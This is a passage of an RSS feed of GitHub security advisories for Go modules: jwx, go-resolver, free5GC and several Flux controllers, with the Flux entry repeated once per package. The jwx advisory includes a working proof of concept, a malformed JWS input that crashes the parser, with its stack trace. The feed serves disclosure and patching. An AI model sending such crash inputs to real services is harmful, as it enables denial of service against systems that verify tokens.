<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
    <title>Security Advisory for Go modules</title>
    <updated>2024-01-25T23:01:21.848Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
    <subtitle>Security Advisory for Go modules on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[github.com/lestrrat-go/jwx] Parsing JSON serialized payload without protected field can lead to segfault]]></title>
        <id>https://github.com/advisories/GHSA-pvcr-v8j8-j5q3</id>
        <link href="https://github.com/advisories/GHSA-pvcr-v8j8-j5q3"/>
        <updated>2024-01-24T16:16:57.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>Calling <code>jws.Parse</code> with a JSON serialized payload where the <code>signature</code> field is present while <code>protected</code> is absent can lead to a nil pointer dereference.</p>
<h3 id="details">Details</h3>
<p>This seems to also affect other functions that calls <code>Parse</code> internally, like <code>jws.Verify</code>.</p>
<p>My understanding of these functions from the docs is that they are supposed to fail gracefully on invalid input and don't require any prior validation.</p>
<p>Based on the stack trace in the PoC, the issue seems to be that the processing done in <code>jws/message.go:UnmarshalJSON()</code> assumes that if a <code>signature</code> field is present, then a <code>protected</code> field is also present. If this is not the case, then the subsequent call to <code>getB64Value(sig.protected)</code> will dereference <code>sig.protected</code>, which is <code>nil</code>.</p>
<h3 id="poc">PoC</h3>
<p>Reproducer:</p>
<pre><code class="language-go">package poc

import (
        "testing"

        "github.com/lestrrat-go/jwx/v2/jws"
)

func TestPOC(t *testing.T) {
        _, _ = jws.Parse([]byte(`{"signature": ""}`))
}
</code></pre>
<p>Result:</p>
<pre><code>$ go test        
--- FAIL: TestPOC (0.00s)
panic: runtime error: invalid memory address or nil pointer dereference [recovered]
        panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x40 pc=0x5fd618]

goroutine 6 [running]:
testing.tRunner.func1.2({0x628800, 0x831030})
        /usr/local/go/src/testing/testing.go:1545 +0x238
testing.tRunner.func1()
        /usr/local/go/src/testing/testing.go:1548 +0x397
panic({0x628800?, 0x831030?})
        /usr/local/go/src/runtime/panic.go:914 +0x21f
github.com/lestrrat-go/jwx/v2/jws.getB64Value({0x0?, 0x0?})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:484 +0x18
github.com/lestrrat-go/jwx/v2/jws.(*Message).UnmarshalJSON(0xc0000a2140, {0xc0000ec000, 0x11, 0x200})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/message.go:323 +0x4ad
encoding/json.(*decodeState).object(0xc0000ea028, {0x64fa60?, 0xc0000a2140?, 0x16?})
        /usr/local/go/src/encoding/json/decode.go:604 +0x6cc
encoding/json.(*decodeState).value(0xc0000ea028, {0x64fa60?, 0xc0000a2140?, 0xc00006e630?})
        /usr/local/go/src/encoding/json/decode.go:374 +0x3e
encoding/json.(*decodeState).unmarshal(0xc0000ea028, {0x64fa60?, 0xc0000a2140?})
        /usr/local/go/src/encoding/json/decode.go:181 +0x133
encoding/json.(*Decoder).Decode(0xc0000ea000, {0x64fa60, 0xc0000a2140})
        /usr/local/go/src/encoding/json/stream.go:73 +0x179
github.com/lestrrat-go/jwx/v2/internal/json.Unmarshal({0xc00001a288, 0x11, 0x11}, {0x64fa60, 0xc0000a2140})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/internal/json/json.go:26 +0x97
github.com/lestrrat-go/jwx/v2/jws.parseJSON({0xc00001a288, 0x11, 0x11})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:588 +0x50
github.com/lestrrat-go/jwx/v2/jws.Parse({0xc00001a288, 0x11, 0x11}, {0x0?, 0xc00006e760?, 0x48450f?})
        /home/fredrik/go/pkg/mod/github.com/lestrrat-go/jwx/v2@v2.0.18/jws/jws.go:525 +0x89
poc.TestPOC(0x0?)
        /home/fredrik/src/jwx_poc/poc_test.go:10 +0x57
testing.tRunner(0xc0000e4340, 0x68ef30)
        /usr/local/go/src/testing/testing.go:1595 +0xff
created by testing.(*T).Run in goroutine 1
        /usr/local/go/src/testing/testing.go:1648 +0x3ad
exit status 2
FAIL    poc     0.005s
</code></pre>
<h3 id="impact">Impact</h3>
<p>The vulnerability can be used to crash / DOS a system doing JWS verification.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/lestrrat-go/jwx/security/advisories/GHSA-pvcr-v8j8-j5q3">https://github.com/lestrrat-go/jwx/security/advisories/GHSA-pvcr-v8j8-j5q3</a></li>
<li><a href="https://github.com/lestrrat-go/jwx/commit/0e8802ce6842625845d651456493e7c87625601f">https://github.com/lestrrat-go/jwx/commit/0e8802ce6842625845d651456493e7c87625601f</a></li>
<li><a href="https://github.com/lestrrat-go/jwx/commit/d69a721931a5c48b9850a42404f18e143704adcd">https://github.com/lestrrat-go/jwx/commit/d69a721931a5c48b9850a42404f18e143704adcd</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-21664">https://nvd.nist.gov/vuln/detail/CVE-2024-21664</a></li>
<li><a href="https://github.com/lestrrat-go/jwx/commit/8c53d0ae52d5ab1e2b37c5abb67def9e7958fd65">https://github.com/lestrrat-go/jwx/commit/8c53d0ae52d5ab1e2b37c5abb67def9e7958fd65</a></li>
<li><a href="https://github.com/advisories/GHSA-pvcr-v8j8-j5q3">https://github.com/advisories/GHSA-pvcr-v8j8-j5q3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pvcr-v8j8-j5q3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-01-09T16:18:48.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/peterzen/goresolver] go-resolver vulnerable to attacker-controlled domains due to unvalidated RRSIG RRs]]></title>
        <id>https://github.com/advisories/GHSA-87mm-qxm5-cp3f</id>
        <link href="https://github.com/advisories/GHSA-87mm-qxm5-cp3f"/>
        <updated>2024-01-23T20:39:13.000Z</updated>
        <content type="html"><![CDATA[<p>go-resolver's DNSSEC validation is not performed correctly. An attacker can cause this package to report successful validation for invalid, attacker-controlled records. The owner name of RRSIG RRs is not validated, permitting an attacker to present the RRSIG for an attacker-controlled domain in a response for any other domain.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-3346">https://nvd.nist.gov/vuln/detail/CVE-2022-3346</a></li>
<li><a href="https://github.com/peterzen/goresolver/issues/5">https://github.com/peterzen/goresolver/issues/5</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-0979">https://pkg.go.dev/vuln/GO-2022-0979</a></li>
<li><a href="https://github.com/advisories/GHSA-87mm-qxm5-cp3f">https://github.com/advisories/GHSA-87mm-qxm5-cp3f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-87mm-qxm5-cp3f</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-12-28T03:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/peterzen/goresolver] go-resolver's DNSSEC validation not performed correctly]]></title>
        <id>https://github.com/advisories/GHSA-jr65-gpj5-cw74</id>
        <link href="https://github.com/advisories/GHSA-jr65-gpj5-cw74"/>
        <updated>2024-01-23T20:39:00.000Z</updated>
        <content type="html"><![CDATA[<p>go-resolver's DNSSEC validation is not performed correctly. An attacker can cause this package to report successful validation for invalid, attacker-controlled records. Root DNSSEC public keys are not validated, permitting an attacker to present a self-signed root key and delegation chain.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-3347">https://nvd.nist.gov/vuln/detail/CVE-2022-3347</a></li>
<li><a href="https://github.com/peterzen/goresolver/issues/5#issuecomment-1150214257">https://github.com/peterzen/goresolver/issues/5#issuecomment-1150214257</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1026">https://pkg.go.dev/vuln/GO-2022-1026</a></li>
<li><a href="https://github.com/advisories/GHSA-jr65-gpj5-cw74">https://github.com/advisories/GHSA-jr65-gpj5-cw74</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jr65-gpj5-cw74</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2022-12-28T03:30:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/free5gc/free5gc] free5GC vulnerable to malformed NGAP message crashing the AMF and NGAP decoders]]></title>
        <id>https://github.com/advisories/GHSA-59hj-62f5-fgmc</id>
        <link href="https://github.com/advisories/GHSA-59hj-62f5-fgmc"/>
        <updated>2024-01-23T20:38:22.000Z</updated>
        <content type="html"><![CDATA[<p>In free5GC 3.2.1, a malformed NGAP message can crash the AMF and NGAP decoders via an index-out-of-range panic in <code>aper.GetBitString</code>.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-43677">https://nvd.nist.gov/vuln/detail/CVE-2022-43677</a></li>
<li><a href="https://github.com/free5gc/free5gc/issues/402">https://github.com/free5gc/free5gc/issues/402</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1083">https://pkg.go.dev/vuln/GO-2022-1083</a></li>
<li><a href="https://github.com/advisories/GHSA-59hj-62f5-fgmc">https://github.com/advisories/GHSA-59hj-62f5-fgmc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-59hj-62f5-fgmc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-24T19:00:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/fluxcd/source-controller/api] Improper use of metav1.Duration allows for Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</id>
        <link href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v"/>
        <updated>2024-01-23T20:38:07.000Z</updated>
        <content type="html"><![CDATA[<p>Flux controllers within the affected versions range are vulnerable to a denial of service attack. Users that have permissions to change Flux’s objects, either through a Flux source or directly within a cluster, can provide invalid data to fields <code>.spec.interval</code> or <code>.spec.timeout</code> (and structured variations of these fields), causing the entire object type to stop being processed.</p>
<p>The issue has two root causes: a) the Kubernetes type <code>metav1.Duration</code> not being fully compatible with the Go type <code>time.Duration</code> as explained on <a href="https://github.com/kubernetes/apimachinery/issues/131">upstream report</a>; b) lack of validation within Flux to restrict allowed values.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Admission controllers can be employed to restrict the values that can be used for fields <code>.spec.interval</code> and <code>.spec.timeout</code>, however upgrading to the latest versions is still the recommended mitigation.</p>
<h3 id="credits">Credits</h3>
<p>This issue was reported by Alexander Block (@codablock) through the Flux security mailing list (as <a href="https://fluxcd.io/security/#report-a-vulnerability">recommended</a>).</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in any of the affected repositories.</li>
<li>Contact us at the CNCF Flux channel.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39272">https://nvd.nist.gov/vuln/detail/CVE-2022-39272</a></li>
<li><a href="https://github.com/fluxcd/helm-controller/pull/533">https://github.com/fluxcd/helm-controller/pull/533</a></li>
<li><a href="https://github.com/fluxcd/image-automation-controller/pull/439">https://github.com/fluxcd/image-automation-controller/pull/439</a></li>
<li><a href="https://github.com/fluxcd/image-reflector-controller/pull/314">https://github.com/fluxcd/image-reflector-controller/pull/314</a></li>
<li><a href="https://github.com/fluxcd/kustomize-controller/pull/731">https://github.com/fluxcd/kustomize-controller/pull/731</a></li>
<li><a href="https://github.com/fluxcd/notification-controller/pull/420">https://github.com/fluxcd/notification-controller/pull/420</a></li>
<li><a href="https://github.com/fluxcd/source-controller/pull/903">https://github.com/fluxcd/source-controller/pull/903</a></li>
<li><a href="https://github.com/kubernetes/apimachinery#131">https://github.com/kubernetes/apimachinery#131</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1071">https://pkg.go.dev/vuln/GO-2022-1071</a></li>
<li><a href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-19T18:40:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/fluxcd/notification-controller/api] Improper use of metav1.Duration allows for Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</id>
        <link href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v"/>
        <updated>2024-01-23T20:38:07.000Z</updated>
        <content type="html"><![CDATA[<p>Flux controllers within the affected versions range are vulnerable to a denial of service attack. Users that have permissions to change Flux’s objects, either through a Flux source or directly within a cluster, can provide invalid data to fields <code>.spec.interval</code> or <code>.spec.timeout</code> (and structured variations of these fields), causing the entire object type to stop being processed.</p>
<p>The issue has two root causes: a) the Kubernetes type <code>metav1.Duration</code> not being fully compatible with the Go type <code>time.Duration</code> as explained on <a href="https://github.com/kubernetes/apimachinery/issues/131">upstream report</a>; b) lack of validation within Flux to restrict allowed values.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Admission controllers can be employed to restrict the values that can be used for fields <code>.spec.interval</code> and <code>.spec.timeout</code>, however upgrading to the latest versions is still the recommended mitigation.</p>
<h3 id="credits">Credits</h3>
<p>This issue was reported by Alexander Block (@codablock) through the Flux security mailing list (as <a href="https://fluxcd.io/security/#report-a-vulnerability">recommended</a>).</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in any of the affected repositories.</li>
<li>Contact us at the CNCF Flux channel.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39272">https://nvd.nist.gov/vuln/detail/CVE-2022-39272</a></li>
<li><a href="https://github.com/fluxcd/helm-controller/pull/533">https://github.com/fluxcd/helm-controller/pull/533</a></li>
<li><a href="https://github.com/fluxcd/image-automation-controller/pull/439">https://github.com/fluxcd/image-automation-controller/pull/439</a></li>
<li><a href="https://github.com/fluxcd/image-reflector-controller/pull/314">https://github.com/fluxcd/image-reflector-controller/pull/314</a></li>
<li><a href="https://github.com/fluxcd/kustomize-controller/pull/731">https://github.com/fluxcd/kustomize-controller/pull/731</a></li>
<li><a href="https://github.com/fluxcd/notification-controller/pull/420">https://github.com/fluxcd/notification-controller/pull/420</a></li>
<li><a href="https://github.com/fluxcd/source-controller/pull/903">https://github.com/fluxcd/source-controller/pull/903</a></li>
<li><a href="https://github.com/kubernetes/apimachinery#131">https://github.com/kubernetes/apimachinery#131</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1071">https://pkg.go.dev/vuln/GO-2022-1071</a></li>
<li><a href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-19T18:40:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/fluxcd/kustomize-controller/api] Improper use of metav1.Duration allows for Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</id>
        <link href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v"/>
        <updated>2024-01-23T20:38:07.000Z</updated>
        <content type="html"><![CDATA[<p>Flux controllers within the affected versions range are vulnerable to a denial of service attack. Users that have permissions to change Flux’s objects, either through a Flux source or directly within a cluster, can provide invalid data to fields <code>.spec.interval</code> or <code>.spec.timeout</code> (and structured variations of these fields), causing the entire object type to stop being processed.</p>
<p>The issue has two root causes: a) the Kubernetes type <code>metav1.Duration</code> not being fully compatible with the Go type <code>time.Duration</code> as explained on <a href="https://github.com/kubernetes/apimachinery/issues/131">upstream report</a>; b) lack of validation within Flux to restrict allowed values.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Admission controllers can be employed to restrict the values that can be used for fields <code>.spec.interval</code> and <code>.spec.timeout</code>, however upgrading to the latest versions is still the recommended mitigation.</p>
<h3 id="credits">Credits</h3>
<p>This issue was reported by Alexander Block (@codablock) through the Flux security mailing list (as <a href="https://fluxcd.io/security/#report-a-vulnerability">recommended</a>).</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in any of the affected repositories.</li>
<li>Contact us at the CNCF Flux channel.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39272">https://nvd.nist.gov/vuln/detail/CVE-2022-39272</a></li>
<li><a href="https://github.com/fluxcd/helm-controller/pull/533">https://github.com/fluxcd/helm-controller/pull/533</a></li>
<li><a href="https://github.com/fluxcd/image-automation-controller/pull/439">https://github.com/fluxcd/image-automation-controller/pull/439</a></li>
<li><a href="https://github.com/fluxcd/image-reflector-controller/pull/314">https://github.com/fluxcd/image-reflector-controller/pull/314</a></li>
<li><a href="https://github.com/fluxcd/kustomize-controller/pull/731">https://github.com/fluxcd/kustomize-controller/pull/731</a></li>
<li><a href="https://github.com/fluxcd/notification-controller/pull/420">https://github.com/fluxcd/notification-controller/pull/420</a></li>
<li><a href="https://github.com/fluxcd/source-controller/pull/903">https://github.com/fluxcd/source-controller/pull/903</a></li>
<li><a href="https://github.com/kubernetes/apimachinery#131">https://github.com/kubernetes/apimachinery#131</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1071">https://pkg.go.dev/vuln/GO-2022-1071</a></li>
<li><a href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-19T18:40:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/fluxcd/image-reflector-controller/api] Improper use of metav1.Duration allows for Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</id>
        <link href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v"/>
        <updated>2024-01-23T20:38:07.000Z</updated>
        <content type="html"><![CDATA[<p>Flux controllers within the affected versions range are vulnerable to a denial of service attack. Users that have permissions to change Flux’s objects, either through a Flux source or directly within a cluster, can provide invalid data to fields <code>.spec.interval</code> or <code>.spec.timeout</code> (and structured variations of these fields), causing the entire object type to stop being processed.</p>
<p>The issue has two root causes: a) the Kubernetes type <code>metav1.Duration</code> not being fully compatible with the Go type <code>time.Duration</code> as explained on <a href="https://github.com/kubernetes/apimachinery/issues/131">upstream report</a>; b) lack of validation within Flux to restrict allowed values.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Admission controllers can be employed to restrict the values that can be used for fields <code>.spec.interval</code> and <code>.spec.timeout</code>, however upgrading to the latest versions is still the recommended mitigation.</p>
<h3 id="credits">Credits</h3>
<p>This issue was reported by Alexander Block (@codablock) through the Flux security mailing list (as <a href="https://fluxcd.io/security/#report-a-vulnerability">recommended</a>).</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in any of the affected repositories.</li>
<li>Contact us at the CNCF Flux channel.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39272">https://nvd.nist.gov/vuln/detail/CVE-2022-39272</a></li>
<li><a href="https://github.com/fluxcd/helm-controller/pull/533">https://github.com/fluxcd/helm-controller/pull/533</a></li>
<li><a href="https://github.com/fluxcd/image-automation-controller/pull/439">https://github.com/fluxcd/image-automation-controller/pull/439</a></li>
<li><a href="https://github.com/fluxcd/image-reflector-controller/pull/314">https://github.com/fluxcd/image-reflector-controller/pull/314</a></li>
<li><a href="https://github.com/fluxcd/kustomize-controller/pull/731">https://github.com/fluxcd/kustomize-controller/pull/731</a></li>
<li><a href="https://github.com/fluxcd/notification-controller/pull/420">https://github.com/fluxcd/notification-controller/pull/420</a></li>
<li><a href="https://github.com/fluxcd/source-controller/pull/903">https://github.com/fluxcd/source-controller/pull/903</a></li>
<li><a href="https://github.com/kubernetes/apimachinery#131">https://github.com/kubernetes/apimachinery#131</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1071">https://pkg.go.dev/vuln/GO-2022-1071</a></li>
<li><a href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-19T18:40:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/fluxcd/image-automation-controller/api] Improper use of metav1.Duration allows for Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</id>
        <link href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v"/>
        <updated>2024-01-23T20:38:07.000Z</updated>
        <content type="html"><![CDATA[<p>Flux controllers within the affected versions range are vulnerable to a denial of service attack. Users that have permissions to change Flux’s objects, either through a Flux source or directly within a cluster, can provide invalid data to fields <code>.spec.interval</code> or <code>.spec.timeout</code> (and structured variations of these fields), causing the entire object type to stop being processed.</p>
<p>The issue has two root causes: a) the Kubernetes type <code>metav1.Duration</code> not being fully compatible with the Go type <code>time.Duration</code> as explained on <a href="https://github.com/kubernetes/apimachinery/issues/131">upstream report</a>; b) lack of validation within Flux to restrict allowed values.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Admission controllers can be employed to restrict the values that can be used for fields <code>.spec.interval</code> and <code>.spec.timeout</code>, however upgrading to the latest versions is still the recommended mitigation.</p>
<h3 id="credits">Credits</h3>
<p>This issue was reported by Alexander Block (@codablock) through the Flux security mailing list (as <a href="https://fluxcd.io/security/#report-a-vulnerability">recommended</a>).</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in any of the affected repositories.</li>
<li>Contact us at the CNCF Flux channel.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39272">https://nvd.nist.gov/vuln/detail/CVE-2022-39272</a></li>
<li><a href="https://github.com/fluxcd/helm-controller/pull/533">https://github.com/fluxcd/helm-controller/pull/533</a></li>
<li><a href="https://github.com/fluxcd/image-automation-controller/pull/439">https://github.com/fluxcd/image-automation-controller/pull/439</a></li>
<li><a href="https://github.com/fluxcd/image-reflector-controller/pull/314">https://github.com/fluxcd/image-reflector-controller/pull/314</a></li>
<li><a href="https://github.com/fluxcd/kustomize-controller/pull/731">https://github.com/fluxcd/kustomize-controller/pull/731</a></li>
<li><a href="https://github.com/fluxcd/notification-controller/pull/420">https://github.com/fluxcd/notification-controller/pull/420</a></li>
<li><a href="https://github.com/fluxcd/source-controller/pull/903">https://github.com/fluxcd/source-controller/pull/903</a></li>
<li><a href="https://github.com/kubernetes/apimachinery#131">https://github.com/kubernetes/apimachinery#131</a></li>
<li><a href="https://pkg.go.dev/vuln/GO-2022-1071">https://pkg.go.dev/vuln/GO-2022-1071</a></li>
<li><a href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-10-19T18:40:02.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/fluxcd/helm-controller/api] Improper use of metav1.Duration allows for Denial of Service]]></title>
        <id>https://github.com/advisories/GHSA-f4p5-x4vc-mh4v</id>
        <link href="https://github.com/advisories/GHSA-f4p5-x4vc-mh4v"/>
        <updated>2024-01-23T20:38:07.000Z</updated>
        <content type="html"><![CDATA[<p>Flux controllers within the affected versions range are vulnerable to a denial of service attack. Users that have permissions to change Flux’s objects, either through a Flux source or directly within a cluster, can provide invalid data to fields <code>.spec.interval</code> or <code>.spec.timeout</code> (and structured variations of these fields), causing the entire object type to stop being processed.</p>
<p>The issue has two root causes: a) the Kubernetes type <code>metav1.Duration</code> not being fully compatible with the Go type <code>time.Duration</code> as explained on <a href="https://github.com/kubernetes/apimachinery/issues/131">upstream report</a>; b) lack of validation within Flux to restrict allowed values.</p>
<h3 id="workarounds">Workarounds</h3>
<p>Admission controllers can be employed to restrict the values that can be used for fields <code>.spec.interval</code> and <code>.spec.timeout</code>, however upgrading to the latest versions is still the recommended mitigation.</p>
<h3 id="credits">Credits</h3>
<p>This issue was reported by Alexander Block (@codablock) through the Flux security mailing list (as <a href="https://fluxcd.io/security/#report-a-vulnerability">recommended</a>).</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li>Open an issue in any of the affected repositories.</li>
<li>Contact us at the CNCF Flux channel.</li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v">https://github.com/fluxcd/flux2/security/advisories/GHSA-f4p5-x4vc-mh4v</a></li>
<li><a href="https://github.com/kubernetes/apimachinery/issues/131">https://github.com/kubernetes/apimachinery/issues/131</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39272">https://nvd.nist.gov/vuln/detail/CVE-2022-39272</a></li>
<li><a href="https://github.com/fluxcd/helm-controller/pull/533">https://github.com/fluxcd/helm-controller/pull/533</a></li>
<li><a href="https://github.com/fluxcd/image-automation-controller/pull/439">https://github.com/fluxcd/image-automation-controller/pull/439</a></li>
<li><a href="https://github.com/fluxcd/image-reflector-controller/pull/314">https://github.com/fluxcd/image-reflector-controller/pull/314</a></li>
